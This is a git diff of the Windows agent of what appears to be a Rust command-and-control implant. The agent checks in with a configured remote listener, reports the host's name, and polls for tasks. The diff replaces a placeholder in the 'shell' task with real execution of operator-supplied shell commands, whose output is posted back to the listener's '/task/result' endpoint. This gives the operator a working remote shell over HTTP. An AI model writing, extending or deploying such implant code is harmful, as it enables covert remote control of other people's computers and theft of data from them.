@@ -1,27 +1,25 @@
 // References:
 //  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
 //  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
-use std::{
-    ffi::c_void,
-    sync::{Arc, Mutex},
-    thread,
-    time,
-};
-use windows::core::{Error, HSTRING, PCWSTR, w};
+use std::{thread, time};
+use windows::core::{Error, HSTRING};
 
-use crate::agents::AgentData;
-use crate::Config;
-use crate::handlers::{
-    async_handlers_windows::HRequestAsync,
-    handlers_windows::{HConnect, HInternet, HRequest, HSession},
+use crate::{
+    agents::AgentData,
+    Config,
+    handlers::{
+        async_handlers_windows::HRequestAsync,
+        handlers_windows::{HConnect, HInternet, HRequest, HSession},
+    },
+    systeminfo::systeminfo_windows::get_computer_name,
+    tasks::win::shell::shell,
+    utils::random::random_name,
 };
-use crate::systeminfo::systeminfo_windows::{get_adapters_addresses, get_computer_name};
-use crate::utils::random::random_name;
 
 pub async fn run(config: Config) -> Result<(), Error> {
     let sleep = time::Duration::from_secs(config.sleep);
 
-    let mut hsession = HSession::new()?;
+    let hsession = HSession::new()?;
     let mut hconnect = HConnect::new(
         &hsession,
         HSTRING::from(config.listener.host.to_string()),
@@ -44,7 +42,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
     let agent_name = random_name("agent".to_owned());
     let hostname = match get_computer_name() {
         Ok(name) => name,
-        Err(e) => "unknown".to_string(),
+        Err(_) => "unknown".to_string(),
     };
     let listener_url = format!(
         "{}://{}:{}/",
@@ -65,7 +63,6 @@ pub async fn run(config: Config) -> Result<(), Error> {
     };
     println!("{response}");
 
-    
     loop {
         // TODO: Implement graceful shutdown.
 
@@ -94,14 +91,21 @@ pub async fn run(config: Config) -> Result<(), Error> {
 
         match task_args[0].as_str() {
             "screenshot" => {
+                // Take a screenshot
                 ra.task_result = Some("This is Screenshot.".as_bytes().to_vec());
                 let ra_json = serde_json::to_string(&ra).unwrap();
                 post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
             }
             "shell" => {
-                ra.task_result = Some(format!(
-                    "This is the result for shell command `{}`.", task_args.join(" ")
-                ).as_bytes().to_vec());
+                // Execute shell command
+                match shell(task_args[1..].join(" ")).await {
+                    Ok(result) => {
+                        ra.task_result = Some(result);
+                    }
+                    Err(e) => {
+                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
+                    }
+                }
                 let ra_json = serde_json::to_string(&ra).unwrap();
                 post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
             }
@@ -125,11 +129,11 @@ async fn get(hconnect: &mut HConnect, url_path: String) -> Result<String, Error>
         None,
     )?;
     
-    let result = hrequest.send_req(
+    hrequest.send_req(
         HSTRING::new(),
         0,
         0)?;
-    let result = hrequest.recv_resp()?;
+    hrequest.recv_resp()?;
 
     let mut response = String::new();
     
@@ -137,7 +141,7 @@ async fn get(hconnect: &mut HConnect, url_path: String) -> Result<String, Error>
         let mut dw_size = 0;
 
         if let Err(e) = hrequest.query_data_available(Some(&mut dw_size)) {
-            println!("Error querying data available: {e}");
+            println!("Error querying data available: {}", e.to_string());
         }
 
         if dw_size == 0 {
@@ -165,7 +169,7 @@ async fn get(hconnect: &mut HConnect, url_path: String) -> Result<String, Error>
 }
 
 async fn post(hconnect: &mut HConnect, url_path: String, data: String) -> Result<String, Error> {    
-    let mut hrequest = HRequest::new(
+    let hrequest = HRequest::new(
         hconnect,
         HSTRING::from("POST".to_string()),
         HSTRING::from(url_path.to_string()),
